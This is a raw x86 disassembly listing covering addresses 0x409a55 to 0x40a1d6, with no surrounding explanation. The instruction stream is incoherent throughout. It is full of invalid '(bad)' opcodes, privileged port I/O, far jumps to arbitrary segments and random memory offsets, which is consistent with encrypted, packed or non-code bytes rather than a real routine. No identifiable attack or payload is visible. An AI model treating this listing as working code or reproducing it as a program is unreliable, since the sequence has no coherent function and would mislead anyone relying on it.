  409a55:	fild   QWORD PTR [eax-0x701f8f24]
  409a5b:	clc    
  409a5c:	or     DWORD PTR ds:0xe90208d3,edi
  409a62:	cmc    
  409a63:	add    esi,DWORD PTR [edi-0x53638459]
  409a69:	ins    BYTE PTR es:[edi],dx
  409a6a:	popf   
  409a6b:	pushf  
  409a6c:	outs   dx,DWORD PTR ds:[esi]
  409a6d:	out    0x7c,eax
  409a6f:	push   esp
  409a70:	add    edi,DWORD PTR [edx+0x287e2115]
  409a76:	inc    ebx
  409a77:	xchg   ecx,eax
  409a78:	stos   DWORD PTR es:[edi],eax
  409a79:	aaa    
  409a7a:	mov    ds:0xba390bd5,al
  409a7f:	and    esi,DWORD PTR [ecx]
  409a81:	cwde   
  409a82:	fwait
  409a83:	pop    es
  409a84:	jno    0x409a78
  409a86:	adc    al,0xd1
  409a88:	clc    
  409a89:	sub    DWORD PTR [ebx+0x50a0b007],0x91f9a666
  409a93:	jno    0x409ae4
  409a95:	push   esp
  409a96:	adc    eax,0xdf0ff7ea
  409a9b:	or     eax,0x8ed5eefc
  409aa0:	pop    esp
  409aa1:	dec    eax
  409aa2:	sbb    eax,esp
  409aa4:	jp     0x409a70
  409aa6:	out    dx,al
  409aa7:	jmp    0x6f18c7cd
  409aac:	icebp  
  409aad:	pop    eax
  409aae:	pop    ebx
  409aaf:	xchg   ebx,eax
  409ab0:	sbb    eax,edi
  409ab2:	xor    DWORD PTR [edi],esi
  409ab4:	mov    eax,0x9ea205f3
  409ab9:	call   0xcf9f:0x4e8a991f
  409ac0:	bound  esp,QWORD PTR [ebx-0x550fa1b3]
  409ac6:	aad    0x65
  409ac8:	(bad)  
  409ac9:	hlt    
  409aca:	inc    esp
  409acb:	mov    BYTE PTR [esi],ch
  409acd:	js     0x409b26
  409acf:	ins    DWORD PTR es:[edi],dx
  409ad0:	inc    ebp
  409ad1:	jle    0x409b50
  409ad3:	fld    st(3)
  409ad5:	fidivr WORD PTR [esi]
  409ad7:	inc    edi
  409ad8:	lods   al,BYTE PTR ds:[esi]
  409ad9:	pushf  
  409ada:	sub    DWORD PTR [esi],ecx
  409adc:	dec    edx
  409add:	jo     0x409ad0
  409adf:	xchg   esi,eax
  409ae0:	stos   BYTE PTR es:[edi],al
  409ae1:	dec    edi
  409ae2:	adc    al,BYTE PTR [ebx]
  409ae4:	or     BYTE PTR [ecx-0x73a94f23],cl
  409aea:	adc    BYTE PTR [ecx+0x2c0213a1],0xbd
  409af1:	push   ebx
  409af2:	lock mov dl,0x8c
  409af5:	adc    eax,0xe6d8a8d7
  409afa:	push   ebp
  409afb:	jb     0x409b74
  409afd:	xchg   ebp,eax
  409afe:	scas   al,BYTE PTR es:[edi]
  409aff:	call   0xe4ca:0x598bb87
  409b06:	cmp    DWORD PTR [eax-0x18],eax
  409b09:	outs   dx,DWORD PTR ds:[esi]
  409b0a:	cdq    
  409b0b:	ins    BYTE PTR es:[edi],dx
  409b0c:	gs js  0x409b05
  409b0f:	jnp    0x409b7c
  409b11:	sbb    BYTE PTR [edi],0xed
  409b14:	mov    esp,0xaa2814df
  409b19:	retf   0xf0c2
  409b1c:	xchg   DWORD PTR [edi],edx
  409b1e:	dec    esi
  409b1f:	adc    BYTE PTR [eax],0xb4
  409b22:	jb     0x409ac4
  409b24:	jmp    0x409b1d
  409b26:	test   eax,0xc79ae093
  409b2b:	imul   ecx,edi,0xa43c8fe5
  409b31:	cs in  eax,0x5
  409b34:	cmc    
  409b35:	xor    eax,0x2448c7d8
  409b3a:	bound  esi,QWORD PTR [edx+0xa]
  409b3d:	push   esi
  409b3e:	daa    
  409b3f:	sub    al,0x22
  409b41:	push   edx
  409b42:	dec    esp
  409b43:	out    0xae,eax
  409b45:	inc    DWORD PTR [eax+0x201db011]
  409b4b:	jp     0x409b84
  409b4d:	dec    ebx
  409b4e:	xor    BYTE PTR [ebp+0x13],0xc2
  409b52:	push   ecx
  409b53:	xchg   esp,eax
  409b54:	mov    bl,0xbb
  409b56:	bound  edx,QWORD PTR [ebx-0x63ca8a19]
  409b5c:	mov    DWORD PTR gs:0x76bd0ea5,ebx
  409b63:	jnp    0x409bd2
  409b65:	leave  
  409b66:	icebp  
  409b67:	pop    ds
  409b68:	imul   ebp,DWORD PTR [edi],0xffffffdd
  409b6b:	and    cl,cl
  409b6d:	xlat   BYTE PTR ds:[ebx]
  409b6e:	sbb    BYTE PTR [ebx-0x435db230],dl
  409b74:	cwde   
  409b75:	outs   dx,DWORD PTR ds:[esi]
  409b76:	mov    WORD PTR [eax-0x2626b794],es
  409b7c:	xor    ebx,DWORD PTR [ecx]
  409b7e:	xor    eax,0xe408c199
  409b83:	and    DWORD PTR [edi-0x77],0xe
  409b87:	in     eax,dx
  409b88:	ret    
  409b89:	inc    ecx
  409b8a:	xor    ebx,0x22
  409b8d:	test   DWORD PTR [ebx+ebp*4],edi
  409b90:	xchg   ebp,ebp
  409b92:	int3   
  409b93:	pusha  
  409b94:	mov    ecx,0xdef1de0d
  409b99:	loopne 0x409bea
  409b9b:	bound  ecx,QWORD PTR [edi-0xc]
  409b9e:	mov    ch,0x9c
  409ba1:	mov    al,ds:0x6e4172df
  409ba6:	add    bl,BYTE PTR [ecx+edx*1]
  409ba9:	sub    BYTE PTR [edi],ch
  409bab:	or     bh,dl
  409bad:	shl    DWORD PTR [ecx+0x23],1
  409bb0:	cmc    
  409bb1:	and    ah,BYTE PTR [esi+0x7b9a159]
  409bb7:	popf   
  409bb8:	cld    
  409bb9:	sub    edx,DWORD PTR [edx+0x6c8d0d05]
  409bbf:	xrelease mov DWORD PTR [edi-0x371a9e20],0x4b6d420e
  409bca:	pop    ebp
  409bcb:	jg     0x409bf5
  409bcd:	pop    esi
  409bce:	aas    
  409bcf:	and    dl,BYTE PTR [eax]
  409bd1:	push   es
  409bd2:	inc    ecx
  409bd3:	sub    BYTE PTR [ebx],bh
  409bd5:	inc    eax
  409bd6:	sub    ecx,esi
  409bd8:	loope  0x409c48
  409bda:	xchg   edx,eax
  409bdb:	(bad)  
  409bdc:	popa   
  409bdd:	jg     0x409bf0
  409bdf:	fcom   QWORD PTR [edi+0x6a1ecd11]
  409be5:	sbb    bl,BYTE PTR [edx+0x758d981f]
  409beb:	mov    bl,0x89
  409bed:	je     0x409b79
  409bef:	int    0xd2
  409bf1:	iret   
  409bf2:	adc    esi,DWORD PTR [esi-0x5ebf092c]
  409bf8:	pushf  
  409bf9:	mov    bl,0x63
  409bfb:	and    DWORD PTR ds:[esi+0x62],edx
  409bff:	aam    0x5d
  409c01:	or     edi,edi
  409c03:	push   ebx
  409c04:	or     ah,dh
  409c06:	daa    
  409c07:	cmp    al,0xf5
  409c09:	loopne 0x409c36
  409c0b:	cmc    
  409c0c:	mov    BYTE PTR [ecx],cl
  409c0e:	(bad)  
  409c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c10:	push   ebx
  409c11:	xchg   ebx,eax
  409c12:	dec    edi
  409c13:	xchg   BYTE PTR [eax-0x3d],dh
  409c16:	dec    esi
  409c17:	out    0x4c,eax
  409c19:	mov    cl,0x40
  409c1b:	jae    0x409c31
  409c1d:	lock mov ah,0xd5
  409c20:	(bad)  
  409c21:	jp     0x409bd1
  409c23:	sbb    al,0x96
  409c25:	jle    0x409bc1
  409c27:	xchg   ecx,eax
  409c28:	and    eax,0x190773f2
  409c2d:	push   ds
  409c2e:	lock loope 0x409c0f
  409c31:	dec    esp
  409c32:	daa    
  409c33:	dec    edi
  409c34:	push   eax
  409c35:	daa    
  409c36:	mov    ch,0xd9
  409c38:	fisttp WORD PTR [ebx-0x50]
  409c3b:	pop    ss
  409c3c:	lods   al,BYTE PTR ds:[esi]
  409c3d:	xchg   esp,eax
  409c3e:	lea    esi,[eax]
  409c40:	adc    al,0x1a
  409c42:	push   es
  409c43:	gs mov dl,ah
  409c46:	iret   
  409c47:	(bad)  
  409c48:	push   ebp
  409c49:	dec    esi
  409c4a:	in     eax,0x41
  409c4c:	mov    edi,0xf9c397e4
  409c51:	xor    al,0x5c
  409c53:	in     eax,0x34
  409c55:	pop    edx
  409c56:	imul   DWORD PTR [edx]
  409c58:	leave  
  409c59:	(bad)  
  409c5a:	sbb    ch,BYTE PTR [eax-0x6]
  409c5d:	sbb    DWORD PTR [esi],esi
  409c5f:	ret    
  409c60:	test   al,0x12
  409c62:	sbb    cl,BYTE PTR [esi]
  409c64:	xchg   ebp,eax
  409c65:	test   eax,0x503ee239
  409c6a:	xchg   ebx,eax
  409c6b:	cmp    edi,DWORD PTR [ebx+0x1d]
  409c6e:	(bad)  
  409c6f:	xchg   ebp,eax
  409c70:	iret   
  409c71:	mov    ah,0x9d
  409c73:	sub    BYTE PTR [ecx+0x3e6c3fa8],0x8e
  409c7a:	test   DWORD PTR [edi],0xf16936a7
  409c80:	or     BYTE PTR [ecx],dl
  409c82:	stos   DWORD PTR es:[edi],eax
  409c83:	addr16 pop es
  409c85:	cli    
  409c86:	iret   
  409c87:	cmp    DWORD PTR [ebx+0x7e],ebp
  409c8a:	in     al,0xf2
  409c8c:	aam    0xa9
  409c8e:	call   0x983d:0x369f4f37
  409c95:	pop    ebp
  409c96:	sbb    eax,0x748360ae
  409c9b:	inc    edi
  409c9c:	and    BYTE PTR [eax-0x28fe401],ah
  409ca2:	(bad)
  409ca5:	dec    eax
  409ca6:	sbb    DWORD PTR [ebp+eax*8+0x55],ebp
  409caa:	das    
  409cab:	sub    DWORD PTR [esi+0x2a836c93],0xffffffd3
  409cb2:	xor    BYTE PTR [edx+0x4f],dl
  409cb5:	xor    BYTE PTR [esi-0x14],al
  409cb8:	and    esi,ebx
  409cba:	and    BYTE PTR [ecx+0x44],cl
  409cbd:	stos   BYTE PTR es:[edi],al
  409cbe:	inc    esp
  409cbf:	stos   DWORD PTR es:[edi],eax
  409cc0:	ret    
  409cc1:	push   cs
  409cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cc3:	dec    ebp
  409cc4:	inc    ecx
  409cc5:	pop    ebx
  409cc6:	std    
  409cc7:	xor    DWORD PTR [edx],ebx
  409cc9:	fdivr  st,st(7)
  409ccb:	cmc    
  409ccc:	scas   al,BYTE PTR es:[edi]
  409ccd:	cmp    DWORD PTR [ebp+0x6568c3cd],edi
  409cd3:	sub    al,0xd9
  409cd5:	inc    ebx
  409cd6:	xchg   edx,eax
  409cd7:	popa   
  409cd8:	int    0x44
  409cda:	dec    edx
  409cdb:	addr16 xchg esi,eax
  409cdd:	int    0xb0
  409cdf:	fwait
  409ce0:	jmp    0x409ce4
  409ce2:	mov    ah,BYTE PTR [esi-0x2adb289b]
  409ce8:	mov    ebp,DWORD PTR [edi-0x766ad2db]
  409cee:	loope  0x409cf2
  409cf0:	ds sub eax,ebx
  409cf3:	adc    al,0x9f
  409cf5:	jmp    0x319273ec
  409cfa:	xchg   ebp,eax
  409cfb:	icebp  
  409cfc:	jne    0x409c89
  409cfe:	mov    ch,0x79
  409d00:	arpl   WORD PTR [ebp+0x31965374],bp
  409d06:	jle    0x409d3e
  409d08:	fwait
  409d09:	cld    
  409d0a:	or     al,0x1
  409d0c:	lds    eax,FWORD PTR [esi+0x6ac5539b]
  409d12:	stc    
  409d13:	mov    eax,ds:0x7d7e5870
  409d18:	xor    DWORD PTR [ebp+0x1ca7483f],eax
  409d1e:	push   esi
  409d1f:	add    BYTE PTR [ebp+0x29],ah
  409d22:	or     esp,DWORD PTR [edi]
  409d24:	jns    0x409cf4
  409d26:	sub    bh,BYTE PTR [edi]
  409d28:	shr    DWORD PTR [eax+0x52],0x9f
  409d2c:	dec    ebx
  409d2d:	test   eax,0x15af9b3f
  409d32:	mov    al,0xe4
  409d34:	xchg   DWORD PTR [ecx+0x1c],ecx
  409d37:	xor    esi,DWORD PTR [edx+0x686927b6]
  409d3d:	jae    0x409d2c
  409d3f:	push   eax
  409d40:	leave  
  409d41:	jg     0x409d03
  409d43:	call   0x168489ed
  409d48:	xchg   BYTE PTR [ebx+0x3b],bh
  409d4b:	add    al,0x21
  409d4d:	nop
  409d4e:	out    0x86,eax
  409d50:	jae    0x409d3a
  409d52:	popa   
  409d53:	sub    ah,BYTE PTR [edi+0x5a44bd27]
  409d59:	dec    esp
  409d5a:	enter  0x8083,0xce
  409d5e:	sbb    al,0x44
  409d60:	xchg   DWORD PTR [ebx*2+0x562e2ab7],eax
  409d67:	jnp    0x409dd1
  409d69:	mov    eax,0x685161eb
  409d6e:	js     0x409d90
  409d70:	sti    
  409d71:	jns    0x409d36
  409d73:	std    
  409d74:	sub    DWORD PTR [edx-0x52],ecx
  409d77:	iret   
  409d78:	mov    esi,0xc8cff42a
  409d7d:	and    al,bh
  409d7f:	aad    0xe7
  409d81:	xor    al,0x86
  409d83:	mov    dh,0x4b
  409d85:	push   esi
  409d86:	fidiv  WORD PTR [ebx+ebx*4]
  409d89:	mov    ch,0xde
  409d8b:	(bad)  
  409d8c:	(bad)  
  409d8d:	add    al,0x17
  409d8f:	fnstenv [edx-0x5106fddb]
  409d95:	les    ecx,FWORD PTR [edi+0x21632ffe]
  409d9b:	mov    ebp,0xbfd400fc
  409da0:	xlat   BYTE PTR ds:[ebx]
  409da1:	mov    edi,0xa6ed6614
  409da6:	push   eax
  409da7:	fcom   st(7)
  409da9:	pop    edx
  409daa:	dec    esp
  409dab:	xchg   ecx,eax
  409dac:	mov    eax,ds:0x1b408140
  409db1:	push   0xffffffa0
  409db3:	div    ecx
  409db5:	jl     0x409e14
  409db7:	sub    ebx,DWORD PTR [edx-0x16]
  409dba:	cmp    esi,DWORD PTR [edi-0x3d98787d]
  409dc0:	daa    
  409dc1:	nop
  409dc2:	xor    eax,0x8378f4a5
  409dc7:	adc    DWORD PTR [ebx+ebp*8],ecx
  409dca:	mov    cl,0xcd
  409dcc:	jno    0x409e3e
  409dce:	push   edi
  409dcf:	lods   al,BYTE PTR ds:[esi]
  409dd0:	out    0xe0,al
  409dd2:	mov    eax,ds:0x83152389
  409dd7:	sbb    DWORD PTR [ecx+0x2802fd56],edx
  409ddd:	out    0xd7,al
  409ddf:	pop    edi
  409de0:	mov    esi,0x1cd2b24a
  409de5:	and    BYTE PTR [esi+0x63],0x7b
  409de9:	pushf  
  409dea:	push   esp
  409deb:	loope  0x409e08
  409ded:	xchg   ebp,eax
  409dee:	jge    0x409d86
  409df0:	call   0x2541:0x526aa4fe
  409df7:	or     ebx,DWORD PTR [edi+0x404eb17a]
  409dfd:	gs jo  0x409e5e
  409e00:	jbe    0x409e67
  409e02:	mov    eax,0x5e3c49ca
  409e07:	pop    edi
  409e08:	shl    BYTE PTR [ecx-0x73],0x47
  409e0c:	mov    ebx,0xc4b68e6
  409e11:	(bad)  
  409e12:	out    0x75,al
  409e14:	jae    0x409e38
  409e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e17:	jbe    0x409e26
  409e19:	stc    
  409e1a:	call   0xe574:0x874a6556
  409e21:	jae    0x409e4c
  409e23:	pop    ebp
  409e24:	loopne 0x409e86
  409e26:	or     BYTE PTR [ecx+ebx*4],0x37
  409e2a:	mov    ds:0x39b70b6c,eax
  409e2f:	test   DWORD PTR [edx],ecx
  409e31:	dec    edx
  409e32:	jne    0x409dce
  409e34:	push   eax
  409e35:	mov    WORD PTR [ecx-0x63],ss
  409e38:	div    DWORD PTR ds:[ecx-0xf99e40]
  409e3f:	int    0x7d
  409e41:	sbb    DWORD PTR [ebx],ecx
  409e43:	sub    BYTE PTR [edi+ecx*8-0x9],cl
  409e47:	shl    DWORD PTR [edx+0x50],0x5b
  409e4b:	jno    0x409e6c
  409e4d:	pop    edx
  409e4e:	outs   dx,DWORD PTR ds:[esi]
  409e4f:	push   ecx
  409e50:	mov    edi,0xec22f9d0
  409e55:	or     BYTE PTR [ebx+eiz*8+0x9],dl
  409e59:	loopne 0x409dfa
  409e5b:	sbb    edi,DWORD PTR [edx+0x5fb7a992]
  409e61:	mov    esp,0xfebdc743
  409e66:	fs stos BYTE PTR es:[edi],al
  409e68:	mov    ah,BYTE PTR [ebx-0x6f]
  409e6b:	push   cs
  409e6c:	and    BYTE PTR [esi+edx*4-0x14],0xd6
  409e71:	imul   ebp,DWORD PTR [edi],0x69693010
  409e77:	sub    ch,cl
  409e79:	daa    
  409e7a:	mov    ds:0x77b6cd5e,al
  409e7f:	or     al,BYTE PTR [eax-0x5e0580af]
  409e85:	(bad)  
  409e87:	int    0x68
  409e89:	idiv   al
  409e8b:	add    DWORD PTR [ecx-0x23],esi
  409e8e:	xor    al,0xc2
  409e90:	mov    ah,0xff
  409e92:	stos   DWORD PTR es:[edi],eax
  409e93:	cmp    ebp,ebx
  409e95:	sub    DWORD PTR [esi+0x3f],ecx
  409e98:	jle    0x409e6d
  409e9a:	fs scas al,BYTE PTR es:[edi]
  409e9c:	pop    esp
  409e9d:	cmp    DWORD PTR [esp+esi*1-0x1c74b583],edi
  409ea4:	aaa    
  409ea5:	dec    ebx
  409ea6:	and    eax,0x22a96646
  409eab:	repz cdq 
  409ead:	lods   eax,DWORD PTR ds:[esi]
  409eaf:	and    eax,0xd1bca64
  409eb4:	call   esi
  409eb6:	push   es
  409eb7:	test   eax,0x8b151e53
  409ebc:	jmp    0xd789:0x8fad59f0
  409ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ec4:	mov    WORD PTR [esi+0x42caef6e],gs
  409eca:	jnp    0x409f02
  409ecc:	stc    
  409ecd:	sub    al,0x6f
  409ecf:	adc    al,0xf2
  409ed2:	or     eax,0xe00419c
  409ed7:	retf   
  409ed8:	test   BYTE PTR [ecx],dh
  409eda:	outs   dx,DWORD PTR ds:[esi]
  409edb:	cwde   
  409edc:	add    bx,ax
  409edf:	xchg   ebp,eax
  409ee0:	sti    
  409ee1:	dec    esp
  409ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee3:	cld    
  409ee4:	sub    ebp,DWORD PTR [edi+eax*1-0x227cb3b0]
  409eeb:	inc    esi
  409eec:	inc    esi
  409eed:	leave  
  409eee:	dec    edx
  409eef:	jmp    0x5276:0x4f0e355f
  409ef6:	xor    BYTE PTR [esi],bh
  409ef8:	into   
  409ef9:	lods   eax,DWORD PTR ds:[esi]
  409efa:	dec    edx
  409efb:	mov    ah,0xdb
  409efd:	sar    BYTE PTR [ebx+0x229bbe34],1
  409f03:	js     0x409ee5
  409f05:	neg    DWORD PTR [esi]
  409f07:	push   ebx
  409f08:	popa   
  409f09:	sub    al,0xa5
  409f0b:	pusha  
  409f0c:	mov    eax,ds:0x7f7eb979
  409f11:	je     0x409eeb
  409f13:	xor    eax,0x74809c96
  409f18:	js     0x409f19
  409f1a:	hlt    
  409f1b:	and    DWORD PTR [edx+0x1a],ebp
  409f1e:	icebp  
  409f1f:	xor    eax,0x7ab4e9aa
  409f24:	cli    
  409f25:	gs pop esi
  409f27:	iret   
  409f28:	jecxz  0x409f68
  409f2a:	nop
  409f2b:	inc    ecx
  409f2c:	push   edx
  409f2d:	das    
  409f2e:	jl     0x409f38
  409f30:	cmp    eax,0xaae2aa83
  409f35:	xor    ecx,DWORD PTR [edi+0x46f2e95e]
  409f3b:	cmp    edx,DWORD PTR [ebx+edx*2]
  409f3e:	inc    ebx
  409f3f:	push   0x3d
  409f41:	push   ebx
  409f42:	or     al,0x6b
  409f44:	les    ebp,FWORD PTR [edx+esi*1+0x34]
  409f48:	iret   
  409f49:	les    esp,FWORD PTR [eax+ebx*2-0x43]
  409f4d:	bound  esp,QWORD PTR [ebp+0x7b0b8412]
  409f53:	or     BYTE PTR [edx+0x16],0x50
  409f57:	out    dx,al
  409f58:	pop    es
  409f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f5a:	pop    ds
  409f5b:	test   al,0x65
  409f5d:	rcr    cl,cl
  409f5f:	mov    dl,0xc8
  409f61:	loop   0x409ef1
  409f63:	ret    
  409f64:	add    BYTE PTR [ecx],ah
  409f66:	push   cs
  409f67:	cmp    eax,DWORD PTR [eax+0x4c70ea4c]
  409f6d:	outs   dx,BYTE PTR ds:[esi]
  409f6e:	pop    esp
  409f6f:	and    bh,BYTE PTR [eax+edx*1-0x6c]
  409f73:	pop    ss
  409f74:	push   edx
  409f75:	ds push cs
  409f77:	lock ins DWORD PTR es:[edi],dx
  409f79:	not    BYTE PTR [eax+0x5a]
  409f7c:	dec    eax
  409f7d:	push   es
  409f7e:	mov    ebp,0x8f928574
  409f83:	outs   dx,BYTE PTR fs:[esi]
  409f85:	adc    ebx,edx
  409f87:	lock mov ebx,ebx
  409f8a:	xchg   DWORD PTR [ebp+edx*8-0x6bb4f81b],ecx
  409f91:	push   ebx
  409f92:	out    dx,al
  409f93:	jnp    0x409fe1
  409f95:	daa    
  409f96:	(bad)  
  409f97:	cmp    al,0x43
  409f99:	jbe    0x409fef
  409f9b:	lahf   
  409f9c:	xchg   esi,eax
  409f9d:	sbb    al,0xc8
  409f9f:	cli    
  409fa0:	inc    ebp
  409fa1:	jb     0x40a01e
  409fa3:	push   edi
  409fa4:	pop    ecx
  409fa5:	mov    dh,0xe9
  409fa7:	in     eax,0x4a
  409fa9:	jecxz  0x409f35
  409fab:	call   DWORD PTR [ecx]
  409fad:	cmp    al,BYTE PTR [ebx+0x6b]
  409fb0:	pop    es
  409fb1:	pop    ss
  409fb2:	dec    eax
  409fb3:	jmp    0x2b651db6
  409fb8:	stos   DWORD PTR es:[edi],eax
  409fb9:	daa    
  409fba:	test   DWORD PTR [edx-0x6ab0128d],esi
  409fc0:	cld    
  409fc1:	out    0x84,al
  409fc3:	in     al,0x12
  409fc5:	out    0xf,al
  409fc7:	inc    edx
  409fc8:	cmp    eax,0xd11432ad
  409fcd:	stos   DWORD PTR es:[edi],eax
  409fce:	xchg   ecx,eax
  409fcf:	pop    esi
  409fd0:	push   esp
  409fd1:	push   esi
  409fd2:	test   eax,0x4e371b85
  409fd7:	mov    ch,BYTE PTR [edi+edi*4+0x2]
  409fdb:	div    DWORD PTR [edi+eax*1]
  409fde:	add    DWORD PTR [edi+0x5c5b0cd2],esi
  409fe4:	cmp    BYTE PTR [esi+0x34fdd3d7],dh
  409fea:	out    dx,al
  409feb:	outs   dx,BYTE PTR ds:[esi]
  409fec:	push   eax
  409fed:	push   es
  409fee:	adc    esi,edi
  409ff0:	jle    0x409f8c
  409ff2:	sub    eax,0x27291a48
  409ff7:	pop    es
  409ff8:	cmp    BYTE PTR [edx],cl
  409ffa:	push   esi
  409ffb:	jle    0x409fd4
  409ffd:	adc    dh,BYTE PTR [esi]
  409fff:	mov    BYTE PTR [eiz*1+0x4ab03041],dh
  40a006:	pop    edi
  40a007:	loope  0x409fd7
  40a009:	nop
  40a00a:	mov    eax,0x92e4e61f
  40a00f:	xchg   bl,ah
  40a011:	pop    esi
  40a012:	aam    0xeb
  40a014:	pushf  
  40a015:	jno    0x409ff9
  40a017:	xor    al,0x6c
  40a019:	adc    BYTE PTR [ecx-0x5f],ah
  40a01c:	(bad)  
  40a01d:	pop    ecx
  40a01e:	xchg   DWORD PTR [esi-0x7f87cf56],esi
  40a024:	add    eax,DWORD PTR [ecx+0x52]
  40a027:	mov    BYTE PTR [ecx+0x60a74f63],al
  40a02d:	dec    edx
  40a02e:	jge    0x40a023
  40a030:	cmp    al,0x48
  40a032:	lock add BYTE PTR [ecx+0x3d938ce2],cl
  40a039:	jne    0x40a023
  40a03b:	leave  
  40a03c:	in     al,0x98
  40a03e:	inc    esp
  40a03f:	mov    ds:0xe32e9b83,eax
  40a044:	retf   0x38a5
  40a047:	or     al,0x6
  40a049:	scas   eax,DWORD PTR es:[edi]
  40a04a:	imul   ebp,DWORD PTR [edi+0xc],0xffffffa6
  40a04e:	ins    BYTE PTR es:[edi],dx
  40a04f:	not    DWORD PTR [esi+eiz*4-0x63f4242c]
  40a056:	mov    dh,0x5b
  40a058:	aas    
  40a059:	pop    esp
  40a05a:	add    DWORD PTR [edi+0x70f0afa5],eax
  40a060:	dec    esi
  40a061:	enter  0x43c7,0xa4
  40a065:	push   0xc58adb5
  40a06a:	dec    ebx
  40a06b:	pop    eax
  40a06c:	fimul  DWORD PTR [edx+ecx*4]
  40a06f:	imul   ecx,DWORD PTR [ebp-0x66],0x690e6e0
  40a076:	xchg   ebp,eax
  40a077:	sub    al,0xe
  40a079:	mov    cs,WORD PTR [ebp-0x48b05e49]
  40a07f:	arpl   sp,di
  40a081:	dec    esp
  40a082:	add    al,0x83
  40a084:	sbb    al,0xbb
  40a086:	inc    ebp
  40a087:	mov    dl,0xe5
  40a089:	mov    edx,0x298e8bc2
  40a08e:	sub    eax,0x9d0295df
  40a093:	jno    0x40a0c1
  40a095:	pop    eax
  40a096:	dec    ebx
  40a097:	and    eax,esp
  40a099:	ds xchg edx,eax
  40a09b:	js     0x40a0bb
  40a09d:	dec    edi
  40a09e:	cs sub dh,ch
  40a0a1:	les    ecx,FWORD PTR [edx+0x636b7058]
  40a0a7:	pop    ss
  40a0a8:	cwde   
  40a0a9:	cli    
  40a0aa:	mul    DWORD PTR [ebx+0x619f76c4]
  40a0b0:	rcr    cl,cl
  40a0b2:	ficom  DWORD PTR [ecx]
  40a0b4:	mov    dh,0x25
  40a0b6:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b8:	fcomp  QWORD PTR [ebx+0x2d1dbf02]
  40a0be:	sbb    DWORD PTR [eax],eax
  40a0c0:	sbb    al,0xcf
  40a0c2:	adc    ebp,DWORD PTR [edx]
  40a0c4:	stos   BYTE PTR es:[edi],al
  40a0c5:	popa   
  40a0c6:	inc    DWORD PTR [ebx]
  40a0c8:	sbb    DWORD PTR [bp+di+0x414b],edx
  40a0cd:	mov    al,0xa6
  40a0cf:	pop    edx
  40a0d0:	dec    esp
  40a0d1:	(bad)  
  40a0d2:	ja     0x40a142
  40a0d4:	jl     0x40a0a4
  40a0d6:	lods   eax,DWORD PTR ds:[esi]
  40a0d7:	nop
  40a0d8:	jg     0x40a0b1
  40a0da:	sbb    al,0xbe
  40a0dd:	repz mov ds:0xd35c1309,al
  40a0e3:	and    eax,DWORD PTR [edx-0x3]
  40a0e6:	mov    al,ds:0x806627e7
  40a0eb:	inc    ebp
  40a0ec:	sbb    eax,0xc1cabd45
  40a0f1:	cmp    eax,0x62314b4
  40a0f6:	dec    eax
  40a0f7:	out    dx,al
  40a0f8:	call   0xb99e41d9
  40a0fd:	dec    edx
  40a0fe:	es mov dh,0x86
  40a101:	lods   eax,DWORD PTR ds:[esi]
  40a103:	mov    esi,0x80eb4f5c
  40a108:	ror    BYTE PTR [esi],0x53
  40a10b:	sbb    al,0xb4
  40a10d:	jmp    0xf3e8:0xe7b05a6c
  40a114:	push   ss
  40a115:	adc    eax,0x6565b013
  40a11a:	adc    DWORD PTR [ebx],esi
  40a11c:	xor    al,0xa4
  40a11e:	jae    0x40a0ef
  40a120:	xor    al,0x32
  40a122:	in     al,0xef
  40a124:	mov    ch,0xd3
  40a126:	icebp  
  40a127:	fbstp  TBYTE PTR [ebx+0x43]
  40a12a:	dec    edi
  40a12b:	fild   QWORD PTR [ecx-0x1b]
  40a12e:	(bad)  
  40a12f:	pushf  
  40a130:	xor    eax,0x487dd0d0
  40a135:	pop    ecx
  40a136:	addr16 arpl bx,bx
  40a139:	(bad)  
  40a13a:	jbe    0x40a195
  40a13c:	xchg   ebx,eax
  40a13d:	sub    DWORD PTR [ecx],0x38
  40a140:	je     0x40a138
  40a142:	addr16 push cs
  40a144:	jg     0x40a11e
  40a146:	pop    ss
  40a147:	test   BYTE PTR [esi+ebp*2-0x55],ah
  40a14b:	in     al,dx
  40a14c:	imul   eax,DWORD PTR [edx+0x3813a74b],0x36cdf5f2
  40a156:	aas    
  40a157:	call   0x20df:0xd2e44216
  40a15e:	pushf  
  40a15f:	or     DWORD PTR [ecx+edi*8+0x60],esi
  40a163:	in     eax,0x47
  40a165:	xchg   esi,eax
  40a166:	ja     0x40a1d6
  40a168:	push   es
  40a169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a16a:	mov    ah,0xf0
  40a16c:	imul   edx,DWORD PTR ds:0xfd289825,0x55bde734
  40a176:	shl    DWORD PTR [ecx-0x13],1
  40a179:	push   ds
  40a17a:	push   ds
  40a17b:	imul   edx,DWORD PTR [esi],0x6c
  40a17e:	neg    BYTE PTR [ebx-0x9]
  40a181:	(bad)  [edi+0x2a]
  40a184:	gs mov edx,0x36c25bec
  40a18a:	xchg   esi,eax
  40a18b:	jbe    0x40a180
  40a18d:	inc    edi
  40a18e:	pop    ebp
  40a18f:	inc    edi
  40a190:	and    al,0x68
  40a192:	push   cs
  40a193:	jae    0x40a18d
  40a195:	jnp    0x40a1ca
  40a197:	add    eax,0xccc38e24
  40a19c:	cmp    eax,0xf2130ff8
  40a1a1:	inc    esi
  40a1a2:	sbb    DWORD PTR [edx],esi
  40a1a4:	sub    al,0x55
  40a1a6:	sbb    al,0x1a
  40a1a8:	lds    edi,FWORD PTR [ebx+0x462bc8b9]
  40a1ae:	pop    ecx
  40a1af:	ss js  0x40a1be
  40a1b2:	mov    ch,0x80
  40a1b4:	xlat   BYTE PTR ds:[ebx]
  40a1b5:	scas   eax,DWORD PTR es:[edi]
  40a1b6:	fs inc ecx
  40a1b8:	or     eax,0xef169ac3
  40a1bd:	dec    eax
  40a1be:	mov    esi,0x493f45a8
  40a1c3:	add    al,0x66
  40a1c5:	push   0x4a
  40a1c7:	add    eax,0xffffffa1
  40a1ca:	pop    edi
  40a1cb:	fistp  WORD PTR [ecx-0x420da2a2]
  40a1d1:	mov    WORD PTR [eax+0xb],ss
  40a1d4:	sar    esi,cl
  40a1d6:	pop    ds
